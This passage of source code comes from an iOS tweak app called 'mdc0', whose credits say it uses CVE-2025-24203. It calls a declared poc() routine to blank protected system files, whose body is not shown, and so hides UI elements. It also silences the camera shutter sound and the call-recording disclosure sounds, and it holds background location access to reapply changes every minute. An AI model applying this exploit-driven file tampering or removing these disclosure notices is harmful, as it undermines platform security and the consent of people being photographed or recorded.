        func attemptRecovery(optionIndex recoveryOptionIndex: Int, resultHandler handler: @escaping (Bool) -> Void)
        {
            switch self
            {
            case .requiresAlwaysAuthorization:
                let openURL = URL(string: UIApplication.openSettingsURLString)!
                UIApplication.shared.open(openURL, options: [:], completionHandler: handler)
            }
        }
    }
}

class LocationManager: NSObject, ObservableObject
{
    var status: Status? = nil
    
    var location: CLLocation? {
        return self.locationManager.location
    }

    private let locationManager: CLLocationManager
    
    override init()
    {
        self.locationManager = CLLocationManager()
        self.locationManager.distanceFilter = CLLocationDistanceMax
        self.locationManager.pausesLocationUpdatesAutomatically = false
        self.locationManager.allowsBackgroundLocationUpdates = true
        
        if #available(iOS 14.0, *)
        {
            self.locationManager.desiredAccuracy = kCLLocationAccuracyReduced
        }
        else
        {
            self.locationManager.desiredAccuracy = kCLLocationAccuracyThreeKilometers
        }
        
        super.init()
        
        self.locationManager.delegate = self
    }
    
    func start()
    {
        switch self.status
        {
        case .success: return
        case .failure, nil: break
        }
        
        if locationManager.authorizationStatus == .notDetermined || locationManager.authorizationStatus == .authorizedWhenInUse
        {
            self.locationManager.requestAlwaysAuthorization()
            return
        }
        
        self.locationManager.startUpdatingLocation()
    }
    
    func stop()
    {
        self.locationManager.stopUpdatingLocation()
        self.status = nil
    }
}


extension LocationManager: CLLocationManagerDelegate
{
    func locationManager(_ manager: CLLocationManager, didChangeAuthorization status: CLAuthorizationStatus)
    {
        switch status
        {
        case .notDetermined: break
        case .restricted, .denied, .authorizedWhenInUse: self.status = .failure(Error.requiresAlwaysAuthorization)
        case .authorizedAlways: self.start()
        @unknown default: break
        }
    }
    
    func locationManager(_ manager: CLLocationManager, didUpdateLocations locations: [CLLocation])
    {
        self.status = .success(())
    }
    
    func locationManager(_ manager: CLLocationManager, didFailWithError error: Swift.Error)
    {
        if let error = error as? CLError
        {
            guard error.code != .denied else {
                self.status = .failure(Error.requiresAlwaysAuthorization)
                return
            }
        }
        
        self.status = .failure(error)
    }
}

```

`mdc0/ContentView.swift`:

```swift
//
//  ContentView.swift
//  mdc0
//
//  Created by Huy Nguyen‚ù§Ô∏è on 9/5/25.
//

import SwiftUI
import Drops
import notify
import CoreLocation

struct ContentView: View {
    @State private var locationManager = CLLocationManager()
    @AppStorage("enableLocationServices") private var enableLocationServices = false
    @StateObject private var githubUpdater = GitHubUpdater()

    var body: some View {
        NavigationView {
            ScrollView {
                ModuleCard(title: "Hide Dock", icon: "dock.rectangle", backgroundColor: .blue) { HideDockView() }
                ModuleCard(title: "Transparent Noti & Media Player", icon: "square.stack.3d.forward.dottedline", backgroundColor: .purple) { TransparentView() }
                ModuleCard(title: "Hide Home Bar", icon: "arrow.down.to.line.compact", backgroundColor: .orange) { HideHomeBarView() }
                ModuleCard(title: "Hide LS Flash & Camera", icon: "lock.display", backgroundColor: .cyan) { LockscreenIconView() }
                ModuleCard(title: "Remove App Switcher Blur", icon: "square.stack.3d.up.fill", backgroundColor: .indigo) { RemoveAppSwitcherBlurView() }
                ModuleCard(title: "Disable Camera Shutter Sound", icon: "camera.badge.ellipsis", backgroundColor: .red) { ShutterSoundView() }
                ModuleCard(title: "Remove Passcode Theme", icon: "number.square", backgroundColor: .pink) { RemovePasscodeThemeView() }
                ModuleCard(title: "Liquid Detection Icon", icon: "drop.degreesign.fill", backgroundColor: .blue) { LiquidDetectionView() }
                ModuleCard(title: "Status Bar Override", icon: "menubar.rectangle", backgroundColor: .green) { StatusBarOverrideView() }
                ModuleCard(title: "Disable Call Record Notice Sound", icon: "phone.connection.fill", backgroundColor: .brown) { DisableCallRecordNoticeView() }
                ModuleCard(title: "Status Legend", icon: "list.star", backgroundColor: .teal) { StatusView() }
                ModuleCard(title: "Credits", icon: "info.bubble", backgroundColor: .gray) { CreditView() }
            }
            .navigationTitle("mdc0")
            .toolbar {
                ToolbarItem(placement: .navigationBarLeading) {
                    Button(action: {
                        enableLocationServices.toggle()
                        if enableLocationServices {
                            locationManager.requestWhenInUseAuthorization()
                            locationManager.requestAlwaysAuthorization()
                        }
                        terminateApp()
                    }) {
                        Image(systemName: enableLocationServices ? "location.fill" : "location")
                    }
                }
                ToolbarItem(placement: .navigationBarTrailing) {
                    Button(action: {
                        if let url = URL(string: "respring://") {
                            if UIApplication.shared.canOpenURL(url) {
                                UIApplication.shared.open(url, options: [:], completionHandler: nil)
                            } else {
                                fetchAndOpenRespringAssetFromGitHub()
                            }
                        }
                    }) {
                        Label("Respring", systemImage: "arrow.clockwise.circle")
                    }
                }
                ToolbarItem(placement: .navigationBarTrailing) {
                    Button {
                        UIApplication.shared.open(URL(string: "https://github.com/34306/mdc0")!)
                    } label: {
                        Image(systemName: "info.circle")
                    }
                    
                }
            }
        }
        .navigationViewStyle(.stack)
        .preferredColorScheme(.dark)
        .onAppear {
            githubUpdater.checkVersion()
        }
        .alert(isPresented: $githubUpdater.showingUpdateAlert) {
            Alert(
                title: Text("New Version Available"),
                message: Text("Version \(githubUpdater.latestVersion ?? "") is available. Do you want to download it?"),
                primaryButton: .default(Text("Download"), action: {
                    if let url = githubUpdater.downloadURL {
                        UIApplication.shared.open(url)
                    }
                }),
                secondaryButton: .cancel(Text("Later"))
            )
        }
    }
}


```

`mdc0/GitHubUpdater.swift`:

```swift
//
//  GitHubUpdater.swift
//  mdc0
//
//  Created by straight-tamago‚≠êÔ∏è on 2025/05/12.
//

import SwiftUI
import Combine

struct GitHubRelease: Codable {
    let tagName: String
    let htmlURL: String
    let assets: [GitHubAsset]

    enum CodingKeys: String, CodingKey {
        case tagName = "tag_name"
        case htmlURL = "html_url"
        case assets
    }
}

struct GitHubAsset: Codable {
    let browserDownloadURL: URL?

    enum CodingKeys: String, CodingKey {
        case browserDownloadURL = "browser_download_url"
    }
}

class GitHubUpdater: ObservableObject {
    @Published var showingUpdateAlert = false
    @Published var latestVersion: String?
    @Published var downloadURL: URL?

    func getCurrentAppVersion() -> String {
        return Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "0.0.0"
    }

    func checkVersion() {
        guard let url = URL(string: "https://api.github.com/repos/34306/mdc0/releases/latest") else { return }
        URLSession.shared.dataTask(with: url) { data, response, error in
            guard let data = data, error == nil else {
                print("Error fetching release info: \(error?.localizedDescription ?? "Unknown error")")
                return
            }
            if let releaseInfo = try? JSONDecoder().decode(GitHubRelease.self, from: data) {
                let latestVersionString = releaseInfo.tagName.replacingOccurrences(of: "v", with: "")
                let currentVersionString = self.getCurrentAppVersion()
                if latestVersionString.compare(currentVersionString, options: .numeric) == .orderedDescending {
                    DispatchQueue.main.async {
                        self.latestVersion = latestVersionString
                        self.downloadURL = URL(string: "https://github.com/34306/mdc0/releases")
                        self.showingUpdateAlert = true
                    }
                } else {
                    print("Current version is up to date.")
                }
            } else {
                print("Error decoding release info.")
            }
        }.resume()
    }
}

```

`mdc0/Info.plist`:

```plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>UIBackgroundModes</key>
	<array>
		<string>location</string>
		<string>fetch</string>
		<string>processing</string>
	</array>
</dict>
</plist>

```

`mdc0/Modules/CreditView.swift`:

```swift
//
//  Credit.swift
//  mdc0
//
//  Created by straight-tamago‚≠êÔ∏è on 2025/05/12.
//

import SwiftUI

struct CreditView: View {
    var body: some View {
        Text("Made by [34306](https://github.com/34306)\nUI by [timi2506](https://github.com/timi2506) and [straight-tamago](https://x.com/straight_tamago)\nUsing [CVE-2025-24203](https://project-zero.issues.chromium.org/issues/391518636) by Ian Beer\nSupport iOS 15.0 - 18.3.2, you need to respring to take effect using [this app](https://github.com/34306/mdc0/releases/download/1.0/respringapp.ipa) thanks to [Thea](https://x.com/nyaathea)\nThanks to [DuyTran](https://x.com/TranKha50277352) for the Liquid status bar and fake status")
            .font(.caption)
            .foregroundColor(.secondary)
    }
}

```

`mdc0/Modules/DisableCallRecordNoticeView.swift`:

```swift
//
//  DisableCallRecordNoticeView.swift
//  mdc0
//
//  Created by Cascade on 2025/05/12.
//

import SwiftUI
import Drops

// Check if the device is running iOS 18 or later
func isIOS18OrLater() -> Bool {
    if #available(iOS 18.0, *) {
        return true
    }
    return false
}

struct DisableCallRecordNoticeView: View {
    @State private var callRecordNoticeSoundStatus: String = ""
    @State private var timer: Timer?
    @AppStorage("LocCallRecordSound") private var LocCallRecordSound = false
    
    private func applyChanges() {
        // Check if feature is supported on this iOS version
        if !isIOS18OrLater() {
            Drops.show(Drop(
                title: "Disable Call Record Notice Sound", 
                subtitle: "This feature is only available on iOS 18+", 
                icon: UIImage(systemName: "exclamationmark.triangle")
            ))
            return
        }
        
        let paths = [
            "/var/mobile/Library/CallServices/Greetings/default/StartDisclosure.caf",
            "/var/mobile/Library/CallServices/Greetings/default/StartDisclosureWithTone.m4a",
            "/var/mobile/Library/CallServices/Greetings/default/StopDisclosure.caf",
            "/System/Library/PrivateFrameworks/ConversationKit.framework/call_recording_countdown.caf"
        ]
        
        let successCount = execFiles(paths)
        
        Drops.show(Drop(
            title: "Disable Call Record Notice Sound", 
            subtitle: "Success: \(successCount)/\(paths.count) files processed", 
            icon: UIImage(systemName: "phone.connection.fill")
        ))
        
        callRecordNoticeSoundStatus = successCount == paths.count ? "Success" : "Failed"
    }
    
    var body: some View {
        VStack(alignment: .leading, spacing: 10) {
            Text(isIOS18OrLater() ? 
                "Disables the notification sounds played when enabled call recording" : 
                "This feature is only available on iOS 18+")
                .font(.caption)
                .foregroundColor(.secondary)
                .padding(.bottom, 5)
            
            HStack {
                Button("Apply") {
                    applyChanges()
                }
                .buttonStyle(.borderedProminent)
                .disabled(!isIOS18OrLater())
                Spacer()
                ActionStatusCircle(status: callRecordNoticeSoundStatus)
            }
            
            Toggle("Background Keep (Interval 60s)", isOn: $LocCallRecordSound)
                .disabled(!UserDefaults.standard.bool(forKey: "enableLocationServices") || !isIOS18OrLater())
        }
        .foregroundColor(.primary)
        .onAppear {
            timer = Timer.scheduledTimer(withTimeInterval: 60, repeats: true) { _ in
                if LocCallRecordSound && UserDefaults.standard.bool(forKey: "enableLocationServices") && isIOS18OrLater() {
                    applyChanges()
                }
            }
            if !UserDefaults.standard.bool(forKey: "enableLocationServices") || !isIOS18OrLater() {
                LocCallRecordSound = false
            }
        }
        .onDisappear {
            timer?.invalidate()
            timer = nil
        }
    }
}

```

`mdc0/Modules/HideDockView.swift`:

```swift
//
//  HideDock.swift
//  mdc0
//
//  Created by straight-tamago‚≠êÔ∏è on 2025/05/12.
//

import SwiftUI
import Drops

struct HideDockView: View {
    @State private var darkDockStatus: String = ""
    @State private var lightDockStatus: String = ""
    
    var body: some View {
        HStack {
            Button("Apply") {
                darkDockStatus = execFile("/System/Library/PrivateFrameworks/CoreMaterial.framework/dockDark.materialrecipe") ? "Success" : "Failed"
                lightDockStatus = execFile("/System/Library/PrivateFrameworks/CoreMaterial.framework/dockLight.materialrecipe") ? "Success" : "Failed"
                Drops.show(Drop(
                    title: "Hide Dock",
                    subtitle: "Light: \(lightDockStatus), Dark: \(darkDockStatus)",
                    icon: UIImage(systemName: "dock.rectangle")
                ))
            }
            .buttonStyle(.borderedProminent)

            Spacer()
            ActionStatusCircle(status: determineOverallDockStatus())
        }
        .foregroundColor(.primary)
    }

    private func determineOverallDockStatus() -> String {
        if darkDockStatus.isEmpty && lightDockStatus.isEmpty {
            return ""
        }
        if darkDockStatus == "Success" && lightDockStatus == "Success" {
            return "Success"
        }
        if darkDockStatus == "Failed" || lightDockStatus == "Failed" || (darkDockStatus == "Success" && lightDockStatus.isEmpty) || (lightDockStatus == "Success" && darkDockStatus.isEmpty) {
            return "Failed"
        }
        return "" 
    }
}
```

`mdc0/Modules/HideHomeBarView.swift`:

```swift
//
//  HideHomeBar.swift
//  mdc0
//
//  Created by straight-tamago‚≠êÔ∏è on 2025/05/12.
//

import SwiftUI
import Drops

struct HideHomeBarView: View {
    @State private var homeBarStatus: String = ""
    
    var body: some View {
        HStack() {
            Button("Apply") {
                homeBarStatus = execFile("/System/Library/PrivateFrameworks/MaterialKit.framework/Assets.car") ? "Success" : "Failed"
                Drops.show(Drop(
                    title: "Hide Home Bar",
                    subtitle: homeBarStatus,
                    icon: UIImage(systemName: "arrow.down.to.line.compact")
                ))
            }
            .buttonStyle(.borderedProminent)

            Spacer()
            ActionStatusCircle(status: homeBarStatus)
        }
        .foregroundColor(.primary)
    }
}
```

`mdc0/Modules/LiquidDetectionView.swift`:

```swift
//
//  LiquidDetection.swift
//  mdc0
//
//  Created by straight-tamago‚≠êÔ∏è on 2025/05/12.
//

import SwiftUI
import Drops

struct LiquidDetectionView: View {
    @State private var liquidDetectionStatus: String = ""
    
    var body: some View {
        VStack(alignment: .leading, spacing: 10) {
            Text(isIOS17OrLater() ? "Not supported on iOS 17+" : "Works on iOS 16.0 - 16.7.10, kill this app makes it disappear")
                .font(.caption)
                .foregroundColor(.secondary)
                .padding(.bottom, 5)

            HStack {
                Button(
                    liquidDetectionStatus == "Enabled"
                    ? "Disable"
                    : "Enable",
                    systemImage: liquidDetectionStatus == "Enabled" ? "drop" : "drop.fill"
                ) {
                    let willEnable = liquidDetectionStatus != "Enabled"
                    let isSupported = toggleLiquidDetectionIcon(isEnabled: willEnable)

                    if isSupported {
                        liquidDetectionStatus = willEnable ? "Enabled" : "Disabled"
                        Drops.show(Drop(
                            title: "Liquid Detection",
                            subtitle: willEnable ? "Icon enabled" : "Icon disabled",
                            icon: UIImage(systemName: willEnable ? "drop.fill" : "drop")
                        ))
                    } else {
                        Drops.show(Drop(
                            title: "Liquid Detection",
                            subtitle: "Not supported on iOS 17+",
                            icon: UIImage(systemName: "exclamationmark.triangle")
                        ))
                    }
                }
                .buttonStyle(.borderedProminent)
                .symbolRenderingMode(.hierarchical)

                Spacer()
                ActionStatusCircle(status: liquidDetectionStatus)
            }
        }
        .foregroundColor(.primary)
    }
}

```

`mdc0/Modules/LockscreenIconView.swift`:

```swift
//
//  LockscreenIcon.swift
//  mdc0
//
//  Created by straight-tamago‚≠êÔ∏è on 2025/05/12.
//

import SwiftUI
import Drops

struct LockscreenIconView: View {
    @State private var lockscreenIconsStatus: String = ""
    
    var body: some View {
        HStack {
            Button("Apply") {
                lockscreenIconsStatus = execFile("/System/Library/PrivateFrameworks/CoverSheet.framework/Assets.car") ? "Success" : "Failed"
                Drops.show(Drop(
                    title: "Hide LS Flash & Camera",
                    subtitle: lockscreenIconsStatus,
                    icon: UIImage(systemName: "bolt.slash.fill")
                ))
            }
            .buttonStyle(.borderedProminent)

            Spacer()
            ActionStatusCircle(status: lockscreenIconsStatus)
        }
        .foregroundColor(.primary)
    }
}
```

`mdc0/Modules/ModuleCard.swift`:

```swift
//
//  ModuleCard.swift
//  mdc0
//
//  Created by straight-tamago‚≠êÔ∏è on 2025/05/12.
//

import SwiftUI

struct ModuleCard<Content: View>: View {
    let title: String
    let icon: String
    let backgroundColor: Color
    @ViewBuilder let content: Content

    var body: some View {
        VStack(alignment: .leading, spacing: 10) {
            HStack {
                Image(systemName: icon)
                    .font(.title2)
                    .foregroundColor(.primary)
                Text(title)
                    .font(.headline)
                    .foregroundColor(.primary)
                Spacer()
            }
            .padding([.top, .horizontal])

            content
                .padding([.horizontal, .bottom])
        }
        .frame(maxWidth: .infinity)
        .background(backgroundColor.opacity(0.3))
        .cornerRadius(12)
        .padding(.horizontal)
        .shadow(color: backgroundColor.opacity(0.5), radius: 5, x: 0, y: 2)
    }
}

```

`mdc0/Modules/RemoveAppSwitcherBlurView.swift`:

```swift
//
//  AppSwitcherBlur.swift
//  mdc0
//
//  Created by straight-tamago‚≠êÔ∏è on 2025/05/12.
//

import SwiftUI
import Drops

struct RemoveAppSwitcherBlurView: View {
    @State private var appSwitcherBlurStatus: String = ""
    
    var body: some View {
        HStack {
            Button("Apply") {
                let paths = [
                    "/System/Library/PrivateFrameworks/SpringBoard.framework/homeScreenBackdrop-application.materialrecipe",
                    "/System/Library/PrivateFrameworks/SpringBoard.framework/homeScreenBackdrop-switcher.materialrecipe"
                ]
                let successCount = execFiles(paths)
                appSwitcherBlurStatus = "Success: \(successCount)/\(paths.count) files processed"
                Drops.show(Drop(
                    title: "Remove App Switcher Blur",
                    subtitle: appSwitcherBlurStatus,
                    icon: UIImage(systemName: "square.stack.fill")
                ))
                appSwitcherBlurStatus = successCount == paths.count ? "Success" : "Failed"
            }
            .buttonStyle(.borderedProminent)

            Spacer()
            ActionStatusCircle(status: appSwitcherBlurStatus)
        }
        .foregroundColor(.primary)
    }
}

```

`mdc0/Modules/RemovePasscodeThemeView.swift`:

```swift
//
//  PasscodeTheme.swift
//  mdc0
//
//  Created by straight-tamago‚≠êÔ∏è on 2025/05/12.
//

import SwiftUI
import Drops

struct RemovePasscodeThemeView: View {
    @State private var passcodeThemeStatus: String = ""
    @State private var selectedTelephonyUIVersion: String = "TelephonyUI-9"
    
    var body: some View {
        VStack(alignment: .leading, spacing: 10) {
            Picker("Select TelephonyUI", selection: $selectedTelephonyUIVersion) {
                ForEach(["TelephonyUI-7", "TelephonyUI-8", "TelephonyUI-9", "TelephonyUI-10"], id: \.self) {
                    Text($0).tag($0)
                }
            }
            .pickerStyle(MenuPickerStyle())
            .foregroundColor(.primary)
            .accentColor(.primary)

            HStack {
                Button("Apply (may not work)", systemImage: "lock.fill") {
                    let buttonSuffixes = [
                        "0---white.png", "1---white.png", "2-A B C--white.png", "3-D E F--white.png",
                        "4-G H I--white.png", "5-J K L--white.png", "6-M N O--white.png",
                        "7-P Q R S--white.png", "8-T U V--white.png", "9-W X Y Z--white.png"
                    ]
                    
                    let versions = selectedTelephonyUIVersion == "All"
                        ? ["TelephonyUI-7", "TelephonyUI-8", "TelephonyUI-9", "TelephonyUI-10"]
                        : [selectedTelephonyUIVersion]
                    
                    let allPaths = versions.flatMap { version in
                        buttonSuffixes.map { "/var/mobile/Library/Caches/\(version)/en-\($0)" }
                    }

                    let successCount = execFiles(allPaths)
                    passcodeThemeStatus = "Success: \(successCount)/\(allPaths.count) files processed"
                    Drops.show(Drop(title: "Remove Passcode Theme", subtitle: passcodeThemeStatus, icon: UIImage(systemName: "lock.fill")))
                }
                .buttonStyle(.borderedProminent)
                .symbolRenderingMode(.hierarchical)

                Spacer()
                ActionStatusCircle(status: passcodeThemeStatus)
            }
        }
        .foregroundColor(.primary)
    }
}

```

`mdc0/Modules/ShutterSoundView.swift`:

```swift
//
//  ShutterSound.swift
//  mdc0
//
//  Created by straight-tamago‚≠êÔ∏è on 2025/05/12.
//

import SwiftUI
import Drops

struct ShutterSoundView: View {
    @State private var cameraShutterSoundStatus: String = ""
    @State private var timer: Timer?
    @AppStorage("LocShutterSound") private var LocShutterSound = false

    private func applyChanges() {
        let paths = [
            "/System/Library/Audio/UISounds/photoShutter.caf",
            "/System/Library/Audio/UISounds/begin_record.caf",
            "/System/Library/Audio/UISounds/end_record.caf",
            "/System/Library/Audio/UISounds/Modern/camera_shutter_burst.caf",
            "/System/Library/Audio/UISounds/Modern/camera_shutter_burst_begin.caf",
            "/System/Library/Audio/UISounds/Modern/camera_shutter_burst_end.caf"
        ]
        let successCount = execFiles(paths)
        cameraShutterSoundStatus = "Success: \(successCount)/\(paths.count) files processed"
        Drops.show(Drop(
            title: "Disable Camera Shutter Sound",
            subtitle: cameraShutterSoundStatus,
            icon: UIImage(systemName: "camera.fill")
        ))
        cameraShutterSoundStatus = successCount == paths.count ? "Success" : "Failed"
    }
    
    var body: some View {
        VStack(alignment: .leading, spacing: 10) {
            Text("Killing the Camera app may turn back on the sound")
                .font(.caption)
                .foregroundColor(.secondary)
                .padding(.bottom, 5)

            HStack {
                Button("Apply") {
                    applyChanges()
                }
                .buttonStyle(.borderedProminent)
                Spacer()
                ActionStatusCircle(status: cameraShutterSoundStatus)
            }

            Toggle("Background Keep (Interval 60s)", isOn: $LocShutterSound)
            .disabled(!UserDefaults.standard.bool(forKey: "enableLocationServices"))
        }
        .foregroundColor(.primary)
        .onAppear {
            timer = Timer.scheduledTimer(withTimeInterval: 60, repeats: true) { _ in
                if LocShutterSound && UserDefaults.standard.bool(forKey: "enableLocationServices") {
                    applyChanges()
                }
            }
            if !UserDefaults.standard.bool(forKey: "enableLocationServices") {
                LocShutterSound = false
            }
        }
        .onDisappear {
            timer?.invalidate()
            timer = nil
        }
    }
}

```

`mdc0/Modules/Status.swift`:

```swift
//
//  Untitled.swift
//  mdc0
//
//  Created by straight-tamago‚≠êÔ∏è on 2025/05/12.
//

import SwiftUI

struct ActionStatusCircle: View {
    var status: String

    var body: some View {
        Circle()
            .frame(width: 10, height: 10)
            .foregroundColor(color(for: status))
            .background {
                Circle()
                    .stroke(.primary, lineWidth: 3)
            }
    }

    private func color(for status: String) -> Color {
        switch status {
        case "Success":
            return .green
        case "Failed":
            return .red
        default:
            return Color(uiColor: .lightGray)
        }
    }
}

struct StatusView: View {
    var body: some View {
        VStack(alignment: .leading, spacing: 10) {
            HStack {
                Text("None")
                    .foregroundStyle(.primary)
                Spacer()
                ActionStatusCircle(status: "")
            }
            HStack {
                Text("Success")
                    .foregroundStyle(.primary)
                Spacer()
                ActionStatusCircle(status: "Success")
            }
            HStack {
                Text("Failed")
                    .foregroundStyle(.primary)
                Spacer()
                ActionStatusCircle(status: "Failed")
            }
        }
    }
}

```

`mdc0/Modules/StatusBarOverrideView.swift`:

```swift
//
//  StatusBar.swift
//  mdc0
//
//  Created by straight-tamago‚≠êÔ∏è on 2025/05/12.
//

import SwiftUI
import Drops

struct StatusBarOverrideView: View {
    @State private var statusBarOverrideStatus: String = ""
    @State private var customOverrideValue: String = ""
    @State private var selectedOverrideValue: Int32 = 2147483647
    @State private var showingOverrideOptions: Bool = false
    
    var body: some View {
        VStack(alignment: .leading, spacing: 10) {
            Text(isIOS17OrLater() ? "Not supported on iOS 17+" : "Works on iOS 16.0 - 16.7.10, kill this app to remove")
                .font(.caption)
                .foregroundColor(.secondary)
                .padding(.bottom, 5)
            
            HStack {
                Picker("Status Bar Override", selection: $selectedOverrideValue) {
                    Text("UNKNOWN GOD").tag(Int32(2147483647))
                    Text("Calling").tag(Int32(1))
                    Text("Microphone").tag(Int32(4))
                    Text("FaceTime").tag(Int32(16))
                    Text("Hotspot").tag(Int32(8))
                    Text("AirPlay").tag(Int32(32))
                    Text("Location").tag(Int32(64))
                    Text("Connect Cable").tag(Int32(512))
                    Text("Custom").tag(Int32(-1))
                }
                .pickerStyle(MenuPickerStyle())
                .foregroundColor(.primary)
                .accentColor(.primary)
                .frame(maxWidth: .infinity)
                
                if selectedOverrideValue == -1 {
                    TextField("Value", text: $customOverrideValue)
                        .keyboardType(.numberPad)
                        .textFieldStyle(RoundedBorderTextFieldStyle())
                        .frame(width: 80)
                }
            }
            
            HStack {
                Button(statusBarOverrideStatus == "Enabled" ? "Disable" : "Enable", systemImage: statusBarOverrideStatus == "Enabled" ? "xmark.circle" : "checkmark.circle") {
                    let newStatus = statusBarOverrideStatus != "Enabled" ? "Enabled" : "Disabled"
                    let valueToUse = selectedOverrideValue == -1 ? (Int32(customOverrideValue) ?? 0) : selectedOverrideValue
                    
                    let isSupported: Bool
                    if newStatus == "Enabled" {
                        isSupported = applyStatusBarStyleOverride(value: valueToUse)
                    } else {
                        isSupported = removeStatusBarStyleOverride(value: valueToUse)
                    }
                    
                    if isSupported {
                        statusBarOverrideStatus = newStatus
                        Drops.show(Drop(
                            title: "Status Bar Override",
                            subtitle: "\(newStatus) with value: \(valueToUse)",
                            icon: UIImage(systemName: newStatus == "Enabled" ? "checkmark.circle" : "xmark.circle")
                        ))
                    } else {
                        Drops.show(Drop(
                            title: "Status Bar Override",
                            subtitle: "Not supported on iOS 17+",
                            icon: UIImage(systemName: "exclamationmark.triangle")
                        ))
                    }
                }
                .buttonStyle(.borderedProminent)
                .symbolRenderingMode(.hierarchical)

                Spacer()
                ActionStatusCircle(status: statusBarOverrideStatus)
            }
        }
        .foregroundColor(.primary)
    }
}

```

`mdc0/Modules/Transparent.swift`:

```swift
//
//  Transparent.swift
//  mdc0
//
//  Created by straight-tamago‚≠êÔ∏è on 2025/05/12.
//

import SwiftUI
import Drops

struct TransparentView: View {
    @State private var transparentStatus: String = ""
    
    var body: some View {
        HStack {
            Button("Apply") {
                let paths = [
                    "/System/Library/PrivateFrameworks/CoreMaterial.framework/platterStrokeLight.visualstyleset",
                    "/System/Library/PrivateFrameworks/CoreMaterial.framework/platterStrokeDark.visualstyleset",
                    "/System/Library/PrivateFrameworks/CoreMaterial.framework/plattersDark.materialrecipe",
                    "/System/Library/PrivateFrameworks/SpringBoardHome.framework/folderLight.materialrecipe",
                    "/System/Library/PrivateFrameworks/SpringBoardHome.framework/folderDark.materialrecipe",
                    "/System/Library/PrivateFrameworks/CoreMaterial.framework/platters.materialrecipe"
                ]
                let successCount = execFiles(paths)
                transparentStatus = "Success: \(successCount)/\(paths.count) files processed"
                Drops.show(Drop(
                    title: "Transparent Noti & Media Player",
                    subtitle: transparentStatus,
                    icon: UIImage(systemName: "square.stack.3d.forward.dottedline")
                ))
                transparentStatus = successCount == paths.count ? "Success" : "Failed"
            }
            .buttonStyle(.borderedProminent)

            Spacer()
            ActionStatusCircle(status: transparentStatus)
        }
        .foregroundColor(.primary)
    }
}

```

`mdc0/Preview Content/Preview Assets.xcassets/Contents.json`:

```json
{
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`mdc0/Utils.swift`:

```swift
//
//  Utils.swift
//  mdc0
//
//  Created by straight-tamago‚≠êÔ∏è on 2025/05/12.
//

import Foundation
import SwiftUI
import Drops

// Check if the device is running iOS 17 or later
func isIOS17OrLater() -> Bool {
    if #available(iOS 17.0, *) {
        return true
    }
    return false
}

// Function to toggle liquid detection icon (iOS 16 only)
func toggleLiquidDetectionIcon(isEnabled: Bool) -> Bool {
    // Liquid detection status bar item number
    let liquidDetectionItemNumber: Int32 = 40
    
    if isIOS17OrLater() {
        // Not supported on iOS 17+
        return false
    } else {
        // iOS 16 implementation using UIStatusBarServer
        if isEnabled {
            UIStatusBarServer.addStatusBarItem(liquidDetectionItemNumber)
        } else {
            UIStatusBarServer.removeStatusBarItem(liquidDetectionItemNumber)
        }
        return true // Feature supported on iOS 16
    }
}

// Function to apply style overrides (iOS 16 only)
func applyStatusBarStyleOverride(value: Int32) -> Bool {
    if isIOS17OrLater() {
        // Not supported on iOS 17+
        return false
    } else {
        // iOS 16 implementation using UIStatusBarServer
        UIStatusBarServer.addStyleOverrides(value)
        return true // Feature supported on iOS 16
    }
}

// Function to remove style overrides (iOS 16 only)
func removeStatusBarStyleOverride(value: Int32) -> Bool {
    if isIOS17OrLater() {
        // Not supported on iOS 17+
        return false
    } else {
        // iOS 16 implementation using UIStatusBarServer
        UIStatusBarServer.removeStyleOverrides(value)
        return true // Feature supported on iOS 16
    }
}

func execFiles(_ paths: [String]) -> Int {
    var successCount = 0
    for path in paths {
        if execFile(path) {
            successCount += 1
        }
    }
    return successCount
}

func execFile(_ path: String) -> Bool {
    let path = strdup(path)
    let result = poc(path)
    free(path)
    return result == 0
}

func isAllZero(path: String) -> Bool {
    guard let fh = FileHandle(forReadingAtPath: path) else { return false }
    defer { fh.closeFile() }

    while true {
        let chunk = fh.readData(ofLength: 4096)
        if chunk.isEmpty { break }
        if chunk.contains(where: { $0 != 0 }) { return false }
    }

    return true
}

func terminateApp() {
    UIControl().sendAction(#selector(URLSessionTask.suspend), to: UIApplication.shared, for: nil)
    Timer.scheduledTimer(withTimeInterval: 0.2, repeats: false) { _ in
        exit(0)
    }
}

func fetchAndOpenRespringAssetFromGitHub() {
    print("Fetching GitHub releases...")
    guard let url = URL(string: "https://api.github.com/repos/34306/mdc0/releases") else { return }

    let task = URLSession.shared.dataTask(with: url) { data, response, error in
        guard let data = data, error == nil else {
            DispatchQueue.main.async {
                Drops.show(Drop(title: "Error", subtitle: "Network error"))
            }
            return
        }

        do {
            if let releases = try JSONSerialization.jsonObject(with: data) as? [[String: Any]] {
                for release in releases {
                    if let assets = release["assets"] as? [[String: Any]] {
                        if let respringAsset = assets.first(where: {
                            ($0["name"] as? String)?.lowercased().contains("respring") == true
                        }) {
                            if let downloadUrlString = respringAsset["browser_download_url"] as? String,
                               let downloadUrl = URL(string: downloadUrlString) {
                                DispatchQueue.main.async {
                                    UIApplication.shared.open(downloadUrl)
                                }
                                return
                            }
                        }
                    }
                }
                DispatchQueue.main.async {
                    Drops.show(Drop(title: "Error", subtitle: "Respring asset not found in any release."))
                }
            }
        } catch {
            DispatchQueue.main.async {
                Drops.show(Drop(title: "Error", subtitle: "Json parse error"))
            }
        }
    }

    task.resume()
}

```

`mdc0/mdc0-Bridging-Header.h`:

```h
//
//  Use this file to import your target's public headers that you would like to expose to Swift.
//

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>

int poc(char *path);
int backboard_respring(void);

// UIStatusBarServer private API declaration (iOS 16)
@interface UIStatusBarServer : NSObject
+ (void)addStatusBarItem:(int32_t)arg1;
+ (void)removeStatusBarItem:(int32_t)arg1;
+ (void)addStyleOverrides:(int32_t)arg1;
+ (void)removeStyleOverrides:(int32_t)arg1;
@end

```

`mdc0/mdc0App.swift`:

```swift
//
//  mdc0App.swift
//  mdc0
//
//  Created by Huy Nguyen on 9/5/25.
//

import SwiftUI
import CoreLocation

@main
struct mdc0App: App {
    @UIApplicationDelegateAdaptor(AppDelegate.self) var appDelegate
    var body: some Scene {
        WindowGroup {
            ContentView()
        }
    }
}


extension UNNotificationCategory
{
    static let clipboardReaderIdentifier = "mdc0"
}

class AppDelegate: UIResponder, UIApplicationDelegate {
    var window: UIWindow?

